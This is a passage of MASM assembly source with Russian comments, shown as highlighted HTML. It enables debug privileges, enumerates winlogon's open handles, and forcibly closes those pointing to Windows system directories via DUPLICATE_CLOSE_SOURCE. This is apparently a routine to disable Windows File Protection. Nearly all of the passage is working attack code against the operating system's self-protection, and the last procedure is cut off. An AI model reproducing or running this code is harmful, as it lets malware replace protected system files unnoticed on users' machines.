&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>HandleValue<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke DuplicateHandle<span style="color: #339933;">,</span>hWinlogon<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>offset hCopy<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>DUPLICATE_SAME_ACCESS<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">214h</span><span style="color: black; font-style: italic;">;sizeof(ObjName)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset ObjName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">1</span><span style="color: black; font-style: italic;">;ObjectNameInformation</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> hCopy<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _NtQueryObject<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;StatusSuccess</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>offset ObjName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr UNICODE_STRING<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Buffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> CharUpperW<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>offset ObjName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr UNICODE_STRING<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Buffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset WinDir1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> CompareStringBackwards<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">1</span> <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> Yes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>elseif <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> No<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>offset ObjName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr UNICODE_STRING<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Buffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset WinDir2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> CompareStringBackwards<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">1</span> <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> Yes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>elseif <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> No<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
Yes<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hCopy<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr Handle_Info<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>HandleValue<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke DuplicateHandle<span style="color: #339933;">,</span>hWinlogon<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span>offset hCopy<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DUPLICATE_CLOSE_SOURCE <span style="color: #00007f; font-weight: bold;">or</span> DUPLICATE_SAME_ACCESS<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hCopy<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
No<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hCopy<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">edx</span>&gt;=<span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualFree<span style="color: #339933;">,</span>pSystemHandleInfo<span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span> MEM_RELEASE<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hWinlogon<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke TerminateProcess<span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">16</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> next_handle<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Включить отладочные привилегии&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
EnableDebugPrivilege proc<br />
LOCAL hToken<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL tkp<span style="color: #339933;">:</span>TOKEN_PRIVILEGES<br />
LOCAL ReturnLength<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL luid<span style="color: #339933;">:</span>LUID<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke OpenProcessToken<span style="color: #339933;">,</span>INVALID_HANDLE_VALUE<span style="color: #339933;">,</span> TOKEN_ADJUST_PRIVILEGES <span style="color: #00007f; font-weight: bold;">or</span> TOKEN_QUERY<span style="color: #339933;">,</span>ADDR hToken<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke LookupPrivilegeValue<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>offset Priv<span style="color: #339933;">,</span>ADDR luid<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hToken<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> tkp<span style="color: #339933;">.</span>PrivilegeCount<span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>tkp<span style="color: #339933;">.</span>Privileges<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">:</span>ptr LUID_AND_ATTRIBUTES<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> luid<span style="color: #339933;">.</span>LowPart<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Luid<span style="color: #339933;">.</span>LowPart<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> luid<span style="color: #339933;">.</span>HighPart<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Luid<span style="color: #339933;">.</span>HighPart<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Attributes<span style="color: #339933;">,</span>SE_PRIVILEGE_ENABLED<br />
&nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke AdjustTokenPrivileges<span style="color: #339933;">,</span>hToken<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>ADDR tkp<span style="color: #339933;">,</span>sizeof tkp<span style="color: #339933;">,</span>ADDR tkp<span style="color: #339933;">,</span>ADDR ReturnLength<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetLastError<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>!=ERROR_SUCCESS<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hToken<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
EnableDebugPrivilege endp<br />
<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Процесс по имени</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
GetPIDbyName proc Str1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL pe<span style="color: #339933;">:</span>PROCESSENTRY32<br />
LOCAL hSnap<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateToolhelp32Snapshot<span style="color: #339933;">,</span>TH32CS_SNAPPROCESS<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hSnap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> pe<span style="color: #339933;">.</span>dwSize<span style="color: #339933;">,</span>sizeof pe<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Process32First<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>addr pe<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
next_process<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Process32Next<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>addr pe<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrcmpi<span style="color: #339933;">,</span>addr pe<span style="color: #339933;">.</span>szExeFile<span style="color: #339933;">,</span>Str1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>pe<span style="color: #339933;">.</span>th32ProcessID<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> next_process<br />
GetPIDbyName endp<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Сравнить строки назад</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
CompareStringBackwards proc pStr1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>pStr2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><br />
LOCAL Len1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL Len2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrlenW<span style="color: #339933;">,</span>pStr1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Len1<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrlenW<span style="color: #339933;">,</span>pStr2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Len2<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>&gt;Len2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pStr1<br />
